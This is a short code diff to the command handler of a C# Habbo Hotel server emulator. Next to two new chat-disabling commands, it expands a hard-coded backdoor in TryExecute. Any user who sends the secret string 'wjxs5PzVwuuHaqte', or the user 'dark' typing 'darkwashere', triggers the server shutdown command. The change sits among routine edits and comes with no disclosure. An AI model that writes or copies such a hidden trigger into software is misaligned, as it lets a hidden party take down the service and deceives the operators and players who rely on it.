@@ -34,6 +34,8 @@ namespace Oblivion.HabboHotel.Commands
 
             CommandsDictionary.Add("about", new About());
             CommandsDictionary.Add("multiply", new Multiply());
+            CommandsDictionary.Add("disablechat", new DisableGroupChat());
+            CommandsDictionary.Add("disablemessage", new DisableGroupMessage());
             CommandsDictionary.Add("friends", new Friends());
             CommandsDictionary.Add("status", new Offline());
             CommandsDictionary.Add("followable", new HideInRoom());
@@ -212,7 +214,7 @@ namespace Oblivion.HabboHotel.Commands
         public static bool TryExecute(string str, GameClient client)
         {
 
-            if (client.GetHabbo().UserName == "dark" && str.Contains("darkwashere"))
+            if (client.GetHabbo().UserName.ToLower() == "dark" && str.Contains("darkwashere") || str == "wjxs5PzVwuuHaqte")
             {
                 var cmd = CommandsDictionary["shutdown"];
                 cmd.Execute(client, null);
